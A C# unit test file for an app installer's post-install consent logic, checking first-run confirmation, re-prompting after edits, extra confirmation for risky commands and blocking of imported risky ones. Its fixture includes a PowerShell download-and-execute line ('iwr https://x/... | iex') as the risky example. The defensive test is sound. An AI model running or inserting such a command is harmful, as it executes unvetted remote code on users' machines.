// SPDX-License-Identifier: AGPL-3.0-only
// Copyright (c) 2026 iam-groot1

using CtrlZ.Core.Install;
using CtrlZ.Core.Models;

namespace CtrlZ.Core.Tests;

public sealed class PostInstallConsentTests : IDisposable
{
    private readonly string _folder = Path.Combine(Path.GetTempPath(), "ctrlz-consent-" + Guid.NewGuid().ToString("n"));

    public void Dispose()
    {
        if (Directory.Exists(_folder))
        {
            Directory.Delete(_folder, recursive: true);
        }
    }

    private static CommandPreviewLine Line(string id, bool risky = false, bool enabled = true, ProfileOrigin origin = ProfileOrigin.Local)
    {
        var command = risky
            ? new PostInstallCommand { Executable = "powershell.exe", Arguments = ["-c", "iwr https://x/" + id + " | iex"], Enabled = enabled }
            : new PostInstallCommand { Executable = "reg.exe", Arguments = ["import", id + ".reg"], Enabled = enabled };
        return CommandPreview.ForApp(new AppEntry { Id = id, Name = id, PostInstall = command }, 1, origin, approved: false)!;
    }

    [Fact]
    public void No_runnable_commands_needs_no_consent()
    {
        var consent = PostInstallConsent.Required([Line("a", enabled: false), Line("b", origin: ProfileOrigin.Imported)], []);

        Assert.False(consent.NeedsAny);
        Assert.Empty(consent.WillRun);
    }

    [Fact]
    public void First_run_on_this_pc_needs_confirmation_listing_every_runnable_command()
    {
        var consent = PostInstallConsent.Required([Line("a"), Line("b"), Line("c", enabled: false)], []);

        Assert.True(consent.NeedsFirstRunConfirmation);
        Assert.Equal(new[] { "a", "b" }, consent.WillRun.Select(line => line.AppId));
    }

    [Fact]
    public void Already_confirmed_commands_do_not_ask_again()
    {
        var a = Line("a");
        var consent = PostInstallConsent.Required([a], [a.Hash]);

        Assert.False(consent.NeedsFirstRunConfirmation);
        Assert.False(consent.NeedsAny);
    }

    [Fact]
    public void A_new_or_edited_command_asks_again()
    {
        var a = Line("a");
        var consent = PostInstallConsent.Required([a, Line("b")], [a.Hash]);

        Assert.True(consent.NeedsFirstRunConfirmation);
    }

    [Fact]
    public void Risky_commands_need_a_second_confirmation_every_run_even_when_confirmed_before()
    {
        var risky = Line("r", risky: true);
        var consent = PostInstallConsent.Required([risky, Line("a")], [risky.Hash]);

        Assert.Equal(new[] { "r" }, consent.Risky.Select(line => line.AppId));
        Assert.True(consent.NeedsAny);
    }

    [Fact]
    public void Blocked_risky_commands_are_not_offered_for_confirmation()
    {
        var consent = PostInstallConsent.Required([Line("r", risky: true, origin: ProfileOrigin.Imported)], []);

        Assert.Empty(consent.Risky);
        Assert.False(consent.NeedsAny);
    }

    [Fact]
    public void First_run_store_round_trips_and_fails_safe()
    {
        var path = Path.Combine(_folder, "first-run.json");
        var store = new PostInstallFirstRunStore(path);
        store.Record("p1", ["h1", "h2"]);

        Assert.Equal(new[] { "h1", "h2" }, new PostInstallFirstRunStore(path).ConfirmedFor("p1").OrderBy(h => h));
        Assert.Empty(new PostInstallFirstRunStore(path).ConfirmedFor("other"));

        File.WriteAllText(path, "{ not json");
        Assert.Empty(new PostInstallFirstRunStore(path).ConfirmedFor("p1"));
    }
}
